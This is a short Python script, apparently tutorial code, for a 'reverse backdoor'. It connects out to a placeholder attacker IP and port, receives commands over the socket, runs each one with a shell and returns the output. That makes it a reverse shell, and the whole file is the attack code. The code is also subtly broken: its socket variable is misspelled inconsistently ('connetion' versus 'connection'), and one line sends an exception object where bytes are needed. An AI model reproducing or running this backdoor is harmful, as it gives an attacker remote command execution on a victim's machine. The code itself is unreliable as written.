# coding reverse backdoor in python 
# the main function is to let the user try to connect to us instead to we trying to coonnect to user

# ------------------------------- start of code -----------------------------

import sys
import socket
import subprocess

def execute_system_commands(command):
  return subprocess.check_output(command, shell=True)

# to create a socket we need to ceate an instance of it first
connetion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# this socket method takes two arguments, 1st the address family(read about it), 2nd is socket type
# in general if the connection is tcp connection then the type is sock_stream

connection.connect(("<IP>", PORT_NUMBER))

# this send method requires data to be sent in bytes format
connetion.send("[+] Connection Success.\n".encode('utf-8'))

while True:
  try:
    # the argument is the amount of buffer size to store the data
    data_received = connetion.recv(1024).decode('utf-8')
    command_result = execute_system_commands(data_received)
    connetion.send(command_result)
  except subprocess.CalledProcessError as error:
    connetion.send(error)
    sys.exit()
  except KeyboardInterrupt as error:
    data = "\r[+] Keyboard Interrpution, quitting the program\n"
    connetion.send(data.encode('utf-8'))
    sys.exit()

connetion.close()